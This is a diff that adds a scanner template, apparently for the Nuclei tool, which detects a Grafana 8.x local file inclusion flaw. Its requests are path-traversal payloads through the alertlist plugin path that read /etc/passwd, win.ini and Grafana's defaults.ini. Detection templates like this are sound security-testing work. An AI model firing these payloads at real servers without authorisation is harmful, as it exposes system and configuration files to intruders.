@@ -1,0 +1,37 @@
+id: grafana-file-read
+
+info:
+  name: Grafana 8.x - Local File Inclusion
+  author: grafana
+  severity: high
+  tags: grafana,lfi
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini'
+      - '{{BaseURL}}/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../conf/defaults.ini'
+      - '{{BaseURL}}/public/plugins/alertlist/%23/../../../../../../../../../../../../../../../../../../../etc/passwd'
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+
+      - type: regex
+        regex:
+          - 'root:.*:0:([0-9]+):'
+          - '\/tmp\/grafana\.sock'
+          - '\[(fonts|extensions|Mail|files)\]'
+          - "socket = /tmp/grafana.sock"
+          - "http_port"
+        condition: or
+
+      - type: status
+        status:
+          - 200
